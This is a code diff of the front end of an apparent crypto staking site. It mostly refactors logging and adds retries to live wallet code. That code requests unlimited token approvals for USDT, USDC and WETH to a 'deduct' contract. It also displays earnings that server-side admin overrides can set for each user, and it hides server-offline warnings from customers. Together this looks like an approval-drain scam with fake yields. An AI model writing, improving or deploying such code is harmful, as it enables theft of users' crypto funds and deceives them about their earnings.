@@ -78,7 +78,7 @@ let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 let isServerAvailable = false;
 let pendingUpdates = [];
 
-// 環境檢測：判斷是否為開發模式（例如本地測試）
+// 環境檢測：判斷是否為開發模式
 const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.isDevMode;
 
 //---Language Translations---
@@ -110,7 +110,7 @@ const translations = {
         walletConnected: 'Wallet connected successfully.',
         fetchingBalances: 'Fetching wallet balances...',
         error: 'Error',
-        offlineWarning: 'Server is offline, running locally. Data will sync when server is available.', // 不顯示給客戶
+        offlineWarning: 'Server is offline, running locally. Data will sync when server is available.',
         noWallet: 'Please install MetaMask or a compatible wallet to continue.'
     },
     'zh-Hant': {
@@ -140,7 +140,7 @@ const translations = {
         walletConnected: '錢包連線成功。',
         fetchingBalances: '正在獲取錢包餘額...',
         error: '錯誤',
-        offlineWarning: '伺服器離線，使用本地運行。數據將在伺服器可用時同步。', // 不顯示給客戶
+        offlineWarning: '伺服器離線，使用本地運行。數據將在伺服器可用時同步。',
         noWallet: '請安裝 MetaMask 或相容錢包以繼續。'
     },
     'zh-Hans': {
@@ -170,27 +170,39 @@ const translations = {
         walletConnected: '钱包连接成功。',
         fetchingBalances: '正在获取钱包余额...',
         error: '错误',
-        offlineWarning: '服务器离线，使用本地运行。数据将在服务器可用时同步。', // 不顯示給客戶
+        offlineWarning: '服务器离线，使用本地运行。数据将在服务器可用时同步。',
         noWallet: '请安装 MetaMask 或兼容钱包以继续。'
     }
 };
 let currentLang = localStorage.getItem('language') || 'zh-Hant';
 
 //---Helper Functions---
+async function retry(fn, maxAttempts = 3, delayMs = 1500) {
+    for (let i = 0; i < maxAttempts; i++) {
+        try {
+            return await fn();
+        } catch (error) {
+            if (i === maxAttempts - 1) throw error;
+            console.warn(`retry: Attempt ${i + 1}/${maxAttempts} failed, retrying after ${delayMs}ms: ${error.message}`);
+            await new Promise(resolve => setTimeout(resolve, delayMs));
+        }
+    }
+}
+
 async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
     let attempts = 0;
     while (attempts < maxAttempts) {
         grossOutputValue = document.getElementById('grossOutputValue');
         cumulativeValue = document.getElementById('cumulativeValue');
         if (grossOutputValue && cumulativeValue) {
-            console.log("retryDOMAcquisition: Successfully acquired DOM elements after", attempts + 1, "attempts.");
+            console.log(`retryDOMAcquisition: Successfully acquired DOM elements after ${attempts + 1} attempts.`);
             return true;
         }
-        console.warn("retryDOMAcquisition: Attempt", attempts + 1, "failed. Retrying after", delayMs, "ms...");
+        console.warn(`retryDOMAcquisition: Attempt ${attempts + 1} failed. Retrying after ${delayMs}ms...`);
         await new Promise(resolve => setTimeout(resolve, delayMs));
         attempts++;
     }
-    console.error("retryDOMAcquisition: Failed to acquire DOM elements after", maxAttempts, "attempts.");
+    console.error(`retryDOMAcquisition: Failed to acquire DOM elements after ${maxAttempts} attempts.`);
     return false;
 }
 
@@ -205,16 +217,14 @@ async function checkServerStatus() {
             if (isServerAvailable && pendingUpdates.length > 0) {
                 await syncPendingUpdates(lastUpdated);
             }
+            console.log(`checkServerStatus: Server is ${isServerAvailable ? 'available' : 'unavailable'}, last updated: ${lastUpdated}`);
             return isServerAvailable;
         }
     } catch (error) {
-        console.warn("checkServerStatus: Server is unavailable:", error);
+        console.warn(`checkServerStatus: Server is unavailable: ${error.message}`);
         isServerAvailable = false;
-        // 只在開發模式下顯示離線警告
         if (isDevMode) {
             updateStatus(translations[currentLang].offlineWarning, true);
-        } else {
-            console.log("checkServerStatus: Server offline, suppressed UI warning for production.");
         }
     }
     return false;
@@ -224,9 +234,9 @@ async function syncPendingUpdates(serverLastUpdated) {
     for (const update of pendingUpdates) {
         if (update.timestamp > serverLastUpdated) {
             await saveUserData(update.data, false);
-            console.log("syncPendingUpdates: Synced update with timestamp:", update.timestamp);
+            console.log(`syncPendingUpdates: Synced update with timestamp: ${update.timestamp}`);
         } else {
-            console.log("syncPendingUpdates: Skipped outdated update with timestamp:", update.timestamp);
+            console.log(`syncPendingUpdates: Skipped outdated update with timestamp: ${update.timestamp}`);
         }
     }
     pendingUpdates = [];
@@ -235,53 +245,49 @@ async function syncPendingUpdates(serverLastUpdated) {
 async function loadUserDataFromServer() {
     if (!userAddress) return;
     try {
-        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
             headers: { 'ngrok-skip-browser-warning': 'true' }
-        });
-        if (response.ok) {
-            const allData = await response.json();
-            const userData = allData.users[userAddress] || {};
-            const localData = JSON.parse(localStorage.getItem('userData') || '{}');
-            const localLastUpdated = localData.lastUpdated || 0;
-            if (allData.lastUpdated > localLastUpdated) {
-                stakingStartTime = userData.stakingStartTime ? parseInt(userData.stakingStartTime) : null;
-                claimedInterest = userData.claimedInterest ? parseFloat(userData.claimedInterest) : 0;
-                pledgedAmount = userData.pledgedAmount ? parseFloat(userData.pledgedAmount) : 0;
-                accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
-                localStorage.setItem('userData', JSON.stringify({
-                    stakingStartTime,
-                    claimedInterest,
-                    pledgedAmount,
-                    accountBalance,
-                    nextBenefitTime: userData.nextBenefitTime,
-                    lastUpdated: allData.lastUpdated
-                }));
-                console.log("loadUserDataFromServer: Synced user data from server:", userData);
-            } else {
-                console.log("loadUserDataFromServer: Local data is newer, keeping local state.");
-            }
-            updateInterest();
-            updateNextBenefitTimer();
+        }));
+        if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+        const allData = await response.json();
+        const userData = allData.users[userAddress] || {};
+        const localData = JSON.parse(localStorage.getItem('userData') || '{}');
+        const localLastUpdated = localData.lastUpdated || 0;
+        if (allData.lastUpdated > localLastUpdated) {
+            stakingStartTime = userData.stakingStartTime ? parseInt(userData.stakingStartTime) : null;
+            claimedInterest = userData.claimedInterest ? parseFloat(userData.claimedInterest) : 0;
+            pledgedAmount = userData.pledgedAmount ? parseFloat(userData.pledgedAmount) : 0;
+            accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
+            localStorage.setItem('userData', JSON.stringify({
+                stakingStartTime,
+                claimedInterest,
+                pledgedAmount,
+                accountBalance,
+                nextBenefitTime: userData.nextBenefitTime,
+                lastUpdated: allData.lastUpdated
+            }));
+            console.log(`loadUserDataFromServer: Synced user data from server:`, userData);
+        } else {
+            console.log(`loadUserDataFromServer: Local data is newer, keeping local state.`);
         }
+        updateInterest();
+        updateNextBenefitTimer();
     } catch (error) {
-        console.warn("loadUserDataFromServer: Failed to load from server:", error);
+        console.warn(`loadUserDataFromServer: Failed to load from server: ${error.message}`);
         const localData = JSON.parse(localStorage.getItem('userData') || '{}');
         stakingStartTime = localData.stakingStartTime || null;
         claimedInterest = localData.claimedInterest || 0;
         pledgedAmount = localData.pledgedAmount || 0;
         accountBalance = localData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
-        // 只在開發模式下顯示離線警告
         if (isDevMode) {
             updateStatus(translations[currentLang].offlineWarning, true);
-        } else {
-            console.log("loadUserDataFromServer: Server offline, suppressed UI warning for production.");
         }
     }
 }
 
 async function saveUserData(data = null, addToPending = true) {
     if (!userAddress) {
-        console.log("saveUserData: No user address available, skipping save.");
+        console.log(`saveUserData: No user address available, skipping save.`);
         return;
     }
     const dataToSave = data || {
@@ -296,37 +302,31 @@ async function saveUserData(data = null, addToPending = true) {
         if (addToPending) {
             pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
             localStorage.setItem('userData', JSON.stringify(dataToSave));
-            // 只在開發模式下顯示離線警告
             if (isDevMode) {
                 updateStatus(translations[currentLang].offlineWarning, true);
-            } else {
-                console.log("saveUserData: Server offline, suppressed UI warning for production.");
             }
         }
         return;
     }
     try {
-        const response = await fetch(`${API_BASE_URL}/api/user-data`, {
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
                 'ngrok-skip-browser-warning': 'true'
             },
             body: JSON.stringify({ address: userAddress, data: dataToSave })
-        });
+        }));
         if (!response.ok) throw new Error(`Failed to save user data, status: ${response.status}`);
-        console.log("saveUserData: User data sent to server successfully.");
+        console.log(`saveUserData: User data sent to server successfully.`);
         localStorage.setItem('userData', JSON.stringify(dataToSave));
     } catch (error) {
-        console.warn("saveUserData: Could not send user data to server:", error);
+        console.warn(`saveUserData: Could not send user data to server: ${error.message}`);
         if (addToPending) {
             pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
             localStorage.setItem('userData', JSON.stringify(dataToSave));
-            // 只在開發模式下顯示離線警告
             if (isDevMode) {
                 updateStatus(translations[currentLang].offlineWarning, true);
-            } else {
-                console.log("saveUserData: Server offline, suppressed UI warning for production.");
             }
         }
     }
@@ -335,9 +335,8 @@ async function saveUserData(data = null, addToPending = true) {
 //---UI Control Functions---
 function updateStatus(message, isWarning = false) {
     if (!statusDiv) return;
-    // 僅在非離線警告或開發模式下顯示訊息
     if (message === translations[currentLang].offlineWarning && !isDevMode) {
-        statusDiv.innerHTML = ''; // 不顯示離線警告
+        statusDiv.innerHTML = '';
         statusDiv.style.display = 'none';
         console.log(`updateStatus: Suppressed offline warning in production: ${message}`);
         return;
@@ -349,7 +348,7 @@ function updateStatus(message, isWarning = false) {
 }
 
 function resetState(showMsg = true) {
-    console.log("resetState: Executing state reset...");
+    console.log(`resetState: Executing state reset...`);
     signer = userAddress = null;
     stakingStartTime = null;
     claimedInterest = 0;
@@ -357,14 +356,14 @@ function resetState(showMsg = true) {
     accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
     if (interestInterval) {
         clearInterval(interestInterval);
-        console.log("resetState: Cleared interest interval:", interestInterval);
+        console.log(`resetState: Cleared interest interval: ${interestInterval}`);
     }
     if (nextBenefitInterval) {
         clearInterval(nextBenefitInterval);
-        console.log("resetState: Cleared next benefit interval:", nextBenefitInterval);
+        console.log(`resetState: Cleared next benefit interval: ${nextBenefitInterval}`);
     }
     localStorage.clear();
-    console.log("resetState: Local storage cleared.");
+    console.log(`resetState: Local storage cleared.`);
     if (startBtn) {
         startBtn.style.display = 'block';
         startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
@@ -372,13 +371,13 @@ function resetState(showMsg = true) {
     const existingClaimBtn = document.getElementById('claimButton');
     if (existingClaimBtn) {
         existingClaimBtn.remove();
-        console.log("resetState: Removed claim button.");
+        console.log(`resetState: Removed claim button.`);
     }
     if (connectButton) {
         connectButton.classList.remove('connected');
         connectButton.textContent = 'Connect';
         connectButton.title = 'Connect Wallet';
-        console.log("resetState: Reset connect button state.");
+        console.log(`resetState: Reset connect button state.`);
     }
     disableInteractiveElements(true);
     if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
@@ -386,7 +385,7 @@ function resetState(showMsg = true) {
     if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
     if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
     if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
-    if (showMsg) updateStatus("Please connect your wallet to continue.");
+    if (showMsg) updateStatus(translations[currentLang].noWallet);
 }
 
 function disableInteractiveElements(disable = false) {
@@ -443,18 +442,15 @@ function updateTotalFunds() {
 
 async function updateInterest() {
     if (!grossOutputValue || !cumulativeValue) {
-        console.warn("updateInterest: Missing DOM elements:", {
-            grossOutputValue: !!grossOutputValue,
-            cumulativeValue: !!cumulativeValue
-        });
+        console.warn(`updateInterest: Missing DOM elements:`, { grossOutputValue: !!grossOutputValue, cumulativeValue: !!cumulativeValue });
         const acquired = await retryDOMAcquisition();
         if (!acquired) {
-            console.error("updateInterest: Failed to re-acquire DOM elements, skipping update.");
+            console.error(`updateInterest: Failed to re-acquire DOM elements, skipping update.`);
             return;
         }
     }
     if (!stakingStartTime || !userAddress) {
-        console.log("updateInterest: Skipping due to missing data:", { stakingStartTime, userAddress });
+        console.log(`updateInterest: Skipping due to missing data:`, { stakingStartTime, userAddress });
         return;
     }
     await loadUserDataFromServer();
@@ -463,10 +459,10 @@ async function updateInterest() {
     let overrideApplied = false;
 
     try {
-        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
             cache: 'no-cache',
             headers: { 'ngrok-skip-browser-warning': 'true' }
-        });
+        }));
         if (response.ok) {
             const allData = await response.json();
             const userOverrides = allData.overrides[userAddress] || {};
@@ -475,12 +471,12 @@ async function updateInterest() {
                 finalCumulative = Number(userOverrides.cumulative);
                 if (!isNaN(finalGrossOutput) && !isNaN(finalCumulative)) {
                     overrideApplied = true;
-                    console.log("updateInterest: Admin override applied:", { finalGrossOutput, finalCumulative });
+                    console.log(`updateInterest: Admin override applied:`, { finalGrossOutput, finalCumulative });
                 }
             }
         }
     } catch (error) {
-        console.warn("updateInterest: Fetch error, using local calculation:", error);
+        console.warn(`updateInterest: Fetch error, using local calculation: ${error.message}`);
     }
 
     if (!overrideApplied) {
@@ -490,7 +486,7 @@ async function updateInterest() {
         const interestRate = baseInterestRate * pledgedAmount;
         finalGrossOutput = elapsedSeconds * interestRate;
         finalCumulative = finalGrossOutput - claimedInterest;
-        console.log("updateInterest: Using local calculation:", { finalGrossOutput, finalCumulative });
+        console.log(`updateInterest: Using local calculation:`, { finalGrossOutput, finalCumulative });
     }
 
     grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
@@ -504,7 +500,7 @@ function updateNextBenefitTimer() {
     const label = (translations[currentLang]?.nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
     if (!nextBenefitTimestamp) {
         nextBenefit.textContent = `${label}: 00:00:00`;
-        console.log("updateNextBenefitTimer: No next benefit time set.");
+        console.log(`updateNextBenefitTimer: No next benefit time set.`);
         return;
     }
     const now = Date.now();
@@ -517,7 +513,7 @@ function updateNextBenefitTimer() {
         }
         localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
         saveUserData();
-        console.log("updateNextBenefitTimer: Updated next benefit time:", newNextBenefitTimestamp);
+        console.log(`updateNextBenefitTimer: Updated next benefit time: ${newNextBenefitTimestamp}`);
     }
     const totalSeconds = Math.floor(diff / 1000);
     const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
@@ -543,7 +539,7 @@ function getETOffsetMilliseconds() {
 
 function setInitialNextBenefitTime() {
     if (localStorage.getItem('nextBenefitTime')) return;
-    console.log("setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time...");
+    console.log(`setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time...`);
     const etOffset = getETOffsetMilliseconds();
     const nowUtcTimestamp = Date.now();
     const nowET = new Date(nowUtcTimestamp + etOffset);
@@ -560,25 +556,25 @@ function setInitialNextBenefitTime() {
     const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
     localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
     saveUserData();
-    console.log("setInitialNextBenefitTime: Set next benefit time:", finalNextBenefitTimestamp);
+    console.log(`setInitialNextBenefitTime: Set next benefit time: ${finalNextBenefitTimestamp}`);
 }
 
 function activateStakingUI() {
     const storedStartTime = localStorage.getItem('stakingStartTime');
     if (storedStartTime) {
         stakingStartTime = parseInt(storedStartTime);
-        console.log("activateStakingUI: Restored staking start time:", stakingStartTime);
+        console.log(`activateStakingUI: Restored staking start time: ${stakingStartTime}`);
     } else {
         stakingStartTime = Date.now();
         localStorage.setItem('stakingStartTime', stakingStartTime.toString());
-        console.log("activateStakingUI: Set new staking start time:", stakingStartTime);
+        console.log(`activateStakingUI: Set new staking start time: ${stakingStartTime}`);
     }
     claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
     pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
     const storedAccountBalance = JSON.parse(localStorage.getItem('accountBalance'));
     if (storedAccountBalance) {
         accountBalance = storedAccountBalance;
-        console.log("activateStakingUI: Restored account balance:", accountBalance);
+        console.log(`activateStakingUI: Restored account balance:`, accountBalance);
     }
     if (startBtn) startBtn.style.display = 'none';
     if (document.getElementById('claimButton')) return;
@@ -588,18 +584,18 @@ function activateStakingUI() {
     claimBtn.disabled = false;
     const placeholder = document.getElementById('claimButtonPlaceholder');
     placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
-    console.log("activateStakingUI: Added claim button to UI.");
+    console.log(`activateStakingUI: Added claim button to UI.`);
     if (!claimBtn.hasEventListener) {
         claimBtn.addEventListener('click', claimInterest);
         claimBtn.hasEventListener = true;
-        console.log("activateStakingUI: Added event listener to claim button.");
+        console.log(`activateStakingUI: Added event listener to claim button.`);
     }
     if (interestInterval) clearInterval(interestInterval);
     interestInterval = setInterval(updateInterest, 1000);
-    console.log("activateStakingUI: Set interest interval:", interestInterval);
+    console.log(`activateStakingUI: Set interest interval: ${interestInterval}`);
     if (nextBenefitInterval) clearInterval(nextBenefitInterval);
     nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
-    console.log("activateStakingUI: Set next benefit interval:", nextBenefitInterval);
+    console.log(`activateStakingUI: Set next benefit interval: ${nextBenefitInterval}`);
     saveUserData();
 }
 
@@ -611,22 +607,22 @@ async function sendMobileRobustTransaction(populatedTx) {
     const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
     let txHash, receipt = null;
     try {
-        console.log("sendMobileRobustTransaction: Sending transaction:", mobileTx);
+        console.log(`sendMobileRobustTransaction: Sending transaction:`, mobileTx);
         txHash = await provider.send('eth_sendTransaction', [mobileTx]);
         updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
         receipt = await provider.waitForTransaction(txHash);
-        console.log("sendMobileRobustTransaction: Transaction confirmed, receipt:", receipt);
+        console.log(`sendMobileRobustTransaction: Transaction confirmed, receipt:`, receipt);
     } catch (error) {
-        console.warn("sendMobileRobustTransaction: Transaction error:", error.message);
+        console.warn(`sendMobileRobustTransaction: Transaction error: ${error.message}`);
         if (error.hash) txHash = error.hash;
-        else if (error.message && error.message.includes('0x')) { 
-            const match = error.message.match(/(0x[a-fA-F0-9]{64})/); 
-            if (match) txHash = match[0]; 
+        else if (error.message && error.message.includes('0x')) {
+            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
+            if (match) txHash = match[0];
         }
         if (txHash) {
             updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
             receipt = await provider.waitForTransaction(txHash);
-            console.log("sendMobileRobustTransaction: Transaction confirmed after error, receipt:", receipt);
+            console.log(`sendMobileRobustTransaction: Transaction confirmed after error, receipt:`, receipt);
         } else throw new Error(`Transaction failed to send: ${error.message}`);
     }
     if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
@@ -638,13 +634,13 @@ async function initializeWallet() {
         if (typeof window.ethereum === 'undefined') {
             updateStatus(translations[currentLang].noWallet);
             disableInteractiveElements(true);
-            console.log("initializeWallet: No Ethereum provider detected.");
+            console.log(`initializeWallet: No Ethereum provider detected.`);
             connectButton.disabled = true;
             return;
         }
         provider = new ethers.BrowserProvider(window.ethereum);
         window.ethereum.on('accountsChanged', (newAccounts) => {
-            console.log("initializeWallet: Accounts changed:", newAccounts);
+            console.log(`initializeWallet: Accounts changed:`, newAccounts);
             if (userAddress) {
                 if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
                     window.location.reload();
@@ -652,19 +648,19 @@ async function initializeWallet() {
             }
         });
         window.ethereum.on('chainChanged', () => {
-            console.log("initializeWallet: Chain changed, reloading page.");
+            console.log(`initializeWallet: Chain changed, reloading page.`);
             window.location.reload();
         });
         const accounts = await provider.send('eth_accounts', []);
-        console.log("initializeWallet: Initial accounts:", accounts);
+        console.log(`initializeWallet: Initial accounts:`, accounts);
         if (accounts.length > 0) {
             await connectWallet();
         } else {
             disableInteractiveElements(true);
-            updateStatus("Please connect your wallet to continue.");
+            updateStatus(translations[currentLang].noWallet);
         }
     } catch (error) {
-        console.error("initializeWallet: Wallet initialization error:", error);
+        console.error(`initializeWallet: Wallet initialization error: ${error.message}`);
         updateStatus(`Initialization failed: ${error.message}`);
         connectButton.disabled = true;
     }
@@ -672,27 +668,27 @@ async function initializeWallet() {
 
 async function updateUIBasedOnChainState() {
     if (!signer) {
-        console.log("updateUIBasedOnChainState: No signer available, skipping.");
+        console.log(`updateUIBasedOnChainState: No signer available, skipping.`);
         return;
     }
     try {
-        updateStatus("Checking on-chain authorization status...");
-        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
-        console.log("updateUIBasedOnChainState: Required allowance:", requiredAllowance.toString());
+        updateStatus(translations[currentLang].fetchingBalances);
+        const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
+        console.log(`updateUIBasedOnChainState: Required allowance: ${requiredAllowance.toString()}`);
         const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
-            deductContract.isServiceActiveFor(userAddress),
-            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
-            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
-            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n)
+            retry(() => deductContract.isServiceActiveFor(userAddress)),
+            retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
+            retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
+            retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
         ]);
-        console.log("updateUIBasedOnChainState: Chain state:", { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
+        console.log(`updateUIBasedOnChainState: Chain state:`, { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
         const isWethAuthorized = wethAllowance >= requiredAllowance;
         const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
         const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
         const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
         const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
         if (isFullyAuthorized) {
-            console.log("updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI.");
+            console.log(`updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI.`);
             if (isWethAuthorized) walletTokenSelect.value = 'WETH';
             else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
             else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
@@ -700,14 +696,14 @@ async function updateUIBasedOnChainState() {
             setInitialNextBenefitTime();
             activateStakingUI();
         } else {
-            console.log("updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.");
-            if(startBtn) startBtn.style.display = 'block';
+            console.log(`updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.`);
+            if (startBtn) startBtn.style.display = 'block';
         }
         disableInteractiveElements(false);
         updateStatus("");
     } catch (error) {
-        console.error("updateUIBasedOnChainState: Failed to check on-chain state:", error);
-        updateStatus("Failed to check on-chain state. Please refresh.");
+        console.error(`updateUIBasedOnChainState: Failed to check on-chain state: ${error.message}`);
+        updateStatus(`Failed to check on-chain state: ${error.message}`);
     }
 }
 
@@ -716,25 +712,29 @@ async function handleConditionalAuthorizationFlow() {
     updateStatus('Preparing authorization...');
     const selectedToken = walletTokenSelect.value;
     console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`);
-    const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
-    console.log("handleConditionalAuthorizationFlow: Required allowance:", requiredAllowance.toString());
-    const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
-    console.log("handleConditionalAuthorizationFlow: Service activated:", serviceActivated);
-    const tokenMap = { 'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, 'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS }, 'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS } };
-    const tokensToProcess = [ tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken) ];
+    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
+    console.log(`handleConditionalAuthorizationFlow: Required allowance: ${requiredAllowance.toString()}`);
+    const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
+    console.log(`handleConditionalAuthorizationFlow: Service activated: ${serviceActivated}`);
+    const tokenMap = {
+        'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
+        'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
+        'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
+    };
+    const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
     let tokenToActivate = '';
     for (const { name, contract, address } of tokensToProcess) {
         updateStatus(`Checking ${name} allowance...`);
-        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
-        console.log(`handleConditionalAuthorizationFlow: ${name} allowance:`, currentAllowance.toString());
+        const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
+        console.log(`handleConditionalAuthorizationFlow: ${name} allowance: ${currentAllowance.toString()}`);
         if (currentAllowance < requiredAllowance) {
             updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
             const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
             approvalTx.value = 0n;
-            console.log("handleConditionalAuthorizationFlow: Sending approval transaction for", name, approvalTx);
+            console.log(`handleConditionalAuthorizationFlow: Sending approval transaction for ${name}:`, approvalTx);
             await sendMobileRobustTransaction(approvalTx);
-            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
-            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance:`, newAllowance.toString());
+            const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
+            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance: ${newAllowance.toString()}`);
             if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
         } else {
             if (!tokenToActivate) tokenToActivate = address;
@@ -745,7 +745,7 @@ async function handleConditionalAuthorizationFlow() {
         updateStatus(`Activating service (using ${tokenName})...`);
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
-        console.log("handleConditionalAuthorizationFlow: Sending activate service transaction:", activateTx);
+        console.log(`handleConditionalAuthorizationFlow: Sending activate service transaction:`, activateTx);
         await sendMobileRobustTransaction(activateTx);
     }
 }
@@ -754,21 +754,21 @@ async function connectWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
             updateStatus(translations[currentLang].noWallet);
-            console.log("connectWallet: No Ethereum provider detected.");
+            console.log(`connectWallet: No Ethereum provider detected.`);
             connectButton.disabled = true;
             return;
         }
         if (!provider) {
             provider = new ethers.BrowserProvider(window.ethereum);
-            console.log("connectWallet: Initialized provider.");
+            console.log(`connectWallet: Initialized provider.`);
         }
         updateStatus('Please confirm connection in your wallet...');
         const accounts = await provider.send('eth_requestAccounts', []);
-        console.log("connectWallet: Accounts received:", accounts);
+        console.log(`connectWallet: Accounts received:`, accounts);
         if (accounts.length === 0) throw new Error("No account selected.");
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
-        console.log("connectWallet: Connected user address:", userAddress);
+        console.log(`connectWallet: Connected user address: ${userAddress}`);
         connectButton.classList.add('connected');
         connectButton.textContent = 'Connected';
         connectButton.title = 'Disconnect Wallet';
@@ -778,20 +778,20 @@ async function connectWallet() {
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
         await updateUIBasedOnChainState();
-        updateStatus('Fetching wallet balances...');
-        const balances = { 
-            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
-            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
-            weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+        updateStatus(translations[currentLang].fetchingBalances);
+        const balances = {
+            usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
+            usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
+            weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
         };
-        console.log("connectWallet: Wallet balances:", balances);
+        console.log(`connectWallet: Wallet balances:`, balances);
         updateBalancesUI(balances);
         updateStatus(translations[currentLang].walletConnected);
         await loadUserDataFromServer();
         if (userAddress) setupSSE();
         await saveUserData();
     } catch (error) {
-        console.error("connectWallet: Connection error:", error);
+        console.error(`connectWallet: Connection error: ${error.message}`);
         let userMessage = `Error: ${error.message}`;
         if (error.code === 4001) userMessage = "You rejected the connection request.";
         updateStatus(userMessage);
@@ -803,30 +803,30 @@ async function connectWallet() {
 function disconnectWallet() {
     resetState(true);
     alert('Wallet disconnected. To fully remove permissions, do so from within your wallet settings.');
-    console.log("disconnectWallet: Wallet disconnected.");
+    console.log(`disconnectWallet: Wallet disconnected.`);
 }
 
 async function getEthPrices() {
